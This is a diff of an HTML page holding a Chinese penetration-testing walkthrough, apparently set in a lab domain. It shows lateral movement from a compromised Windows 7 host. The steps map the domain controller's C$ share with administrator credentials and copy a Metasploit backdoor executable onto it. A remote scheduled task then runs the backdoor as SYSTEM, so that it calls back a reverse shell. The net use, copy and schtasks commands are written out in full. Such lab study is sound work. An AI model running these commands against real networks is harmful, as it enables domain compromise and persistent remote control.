 <p><img src="https://img-blog.csdnimg.cn/20210322203102841.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>这里利用 win7 向域控传一个msf马，并让域控中的马<code>定时开启</code>然后我们只需要在kali<code>设置监听</code>即可</p>
 <p>生成马：(设置反弹shell到win7的9999端口)</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322203212724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>先win7连接域控的c盘共享</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(shell) net use \\192.168.52.138\c$ &quot;cys121&#96;&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) net use \\192.168.52.138\c$ &quot;cys121&#96;&quot; &#x2F;user:&quot;administrator&quot;</span><br></pre></td></tr></table></figure>
 
 <p>查看域控的c盘资源：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(shell) dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) dir \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322203329590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>说明成功</p>
 <p>上传msf马到win7:</p>
 <p>(win7 meterpreter) upload </p>
 <p><img src="https://img-blog.csdnimg.cn/20210322203405657.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/20210322203415382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>将win7的马共享给域控：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(shell) copy c:\Windows\System32\cyshoumen.exe \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(shell) copy c:\Windows\System32\cyshoumen.exe \\192.168.52.138\c$</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322203448363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>看到域控：</p>
 <p><img src="https://img-blog.csdnimg.cn/20210322203457791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>设置一个任务计划，定时启动木马：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn &quot;test&quot; &#x2F;tr C:\cyshoumen.exe &#x2F;sc once &#x2F;st 22:14 &#x2F;S 192.168.52.138 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;cys121&#96;&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;tn &quot;test&quot; &#x2F;tr C:\cyshoumen.exe &#x2F;sc once &#x2F;st 22:14 &#x2F;S 192.168.52.138 &#x2F;RU System &#x2F;u administrator &#x2F;p &quot;cys121&#96;&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://img-blog.csdnimg.cn/20210322203529642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>设置监听：此时应该监听win7的9999端口</p>
 <p>到时间点之后会反弹shell：</p>
